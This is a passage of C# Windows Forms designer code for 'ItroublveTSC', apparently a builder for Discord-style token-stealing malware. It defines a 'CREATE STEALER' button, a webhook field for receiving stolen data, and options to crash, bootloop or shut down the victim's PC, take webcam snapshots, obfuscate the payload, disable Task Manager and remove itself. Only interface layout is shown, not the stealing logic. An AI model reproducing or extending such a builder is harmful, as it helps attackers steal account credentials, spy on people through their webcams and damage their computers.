            this.CreateTokenStealerBtn.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.CreateTokenStealerBtn.OnHoverTextColor = System.Drawing.Color.White;
            this.CreateTokenStealerBtn.Size = new System.Drawing.Size(394, 27);
            this.CreateTokenStealerBtn.TabIndex = 6326;
            this.CreateTokenStealerBtn.Text = "CREATE STEALER";
            this.CreateTokenStealerBtn.TextColor = System.Drawing.Color.White;
            this.CreateTokenStealerBtn.UseVisualStyleBackColor = true;
            this.CreateTokenStealerBtn.Click += new System.EventHandler(this.roundBtn1_Click);
            // 
            // HowToBtn
            // 
            this.HowToBtn.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.HowToBtn.ButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(205)))));
            this.HowToBtn.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.HowToBtn.FlatAppearance.BorderSize = 0;
            this.HowToBtn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.HowToBtn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.HowToBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.HowToBtn.Font = new System.Drawing.Font("Segoe UI Black", 13F, System.Drawing.FontStyle.Bold);
            this.HowToBtn.Location = new System.Drawing.Point(372, 140);
            this.HowToBtn.Name = "HowToBtn";
            this.HowToBtn.OnHoverBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.HowToBtn.OnHoverButtonColor = System.Drawing.Color.FromArgb(((int)(((byte)(88)))), ((int)(((byte)(99)))), ((int)(((byte)(180)))));
            this.HowToBtn.OnHoverTextColor = System.Drawing.Color.White;
            this.HowToBtn.Size = new System.Drawing.Size(133, 285);
            this.HowToBtn.TabIndex = 6330;
            this.HowToBtn.Text = "Information\r\n        &\r\n   Support";
            this.HowToBtn.TextColor = System.Drawing.Color.White;
            this.HowToBtn.UseVisualStyleBackColor = true;
            this.HowToBtn.Click += new System.EventHandler(this.roundBtn1_Click_1);
            // 
            // frmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(34)))), ((int)(((byte)(38)))));
            this.ClientSize = new System.Drawing.Size(537, 494);
            this.Controls.Add(this.panel3);
            this.Controls.Add(this.panel2);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.CheckboxPnl);
            this.Controls.Add(this.CreateTokenStealerBtn);
            this.Controls.Add(this.WebhookPnl);
            this.Controls.Add(this.PnlRainbowDown);
            this.Controls.Add(this.HeadLinePnlInf);
            this.Controls.Add(this.panel7);
            this.Controls.Add(this.HowToBtn);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "frmMain";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "ItroublveTSC";
            this.Load += new System.EventHandler(this.frmMain_Load);
            this.HeadLinePnlInf.ResumeLayout(false);
            this.HeadLinePnlInf.PerformLayout();
            this.WebhookPnl.ResumeLayout(false);
            this.WebhookPnl.PerformLayout();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.panel7.ResumeLayout(false);
            this.CheckboxPnl.ResumeLayout(false);
            this.CheckboxPnl.PerformLayout();
            this.ResumeLayout(false);

		}

		private global::System.ComponentModel.IContainer components = null;

		private global::System.Windows.Forms.Timer RainbowTimer;

		private global::System.Windows.Forms.Panel HeadLinePnlInf;

		private global::System.Windows.Forms.Panel pnlRainbowTop;

		private global::System.Windows.Forms.Button CloseBtn;

		private global::System.Windows.Forms.Panel panel25;

		private global::System.Windows.Forms.ComboBox comboBox3;

		private global::System.Windows.Forms.TextBox textBox3;

		private global::System.Windows.Forms.Button button4;

		private global::System.Windows.Forms.Panel panel26;

		private global::System.Windows.Forms.Panel panel27;

		private global::System.Windows.Forms.Panel panel36;

		private global::System.Windows.Forms.Panel PnlRainbowDown;
        private System.Windows.Forms.Label HeadServerLbl;
        private System.Windows.Forms.TextBox WebHookTxt;
        private System.Windows.Forms.Panel WebhookPnl;
        private RoundBtn CreateTokenStealerBtn;
        private System.Windows.Forms.TextBox CustomExeTxt;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Button HomeBtn;
        private System.Windows.Forms.Panel panel7;
        private System.Windows.Forms.Button button1;
        private RoundBtn HowToBtn;
        private System.Windows.Forms.CheckBox CrashPCchkbox;
        private System.Windows.Forms.CheckBox RestartPCchkbox;
        private System.Windows.Forms.CheckBox ShutdownPCchkbox;
        private System.Windows.Forms.CheckBox AutoRmvExe;
        private System.Windows.Forms.CheckBox BootloopPCchckbox;
        private System.Windows.Forms.CheckBox CustomEXEchkbox;
        private System.Windows.Forms.Panel CheckboxPnl;
        private System.Windows.Forms.Button button3;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.Button button5;
        private System.Windows.Forms.Button button6;
        private System.Windows.Forms.NotifyIcon WinInfo;
        private System.Windows.Forms.ComboBox cbBox;
        private System.Windows.Forms.CheckBox CamSnapchkbox;
        private System.Windows.Forms.CheckBox ObfEXE;
        private System.Windows.Forms.CheckBox avStart;
        private System.Windows.Forms.Panel panel2;
        private System.Windows.Forms.Panel panel3;
        private System.Windows.Forms.CheckBox disableTskMgr;
        private System.Windows.Forms.CheckBox pumpStealer;
    }
}
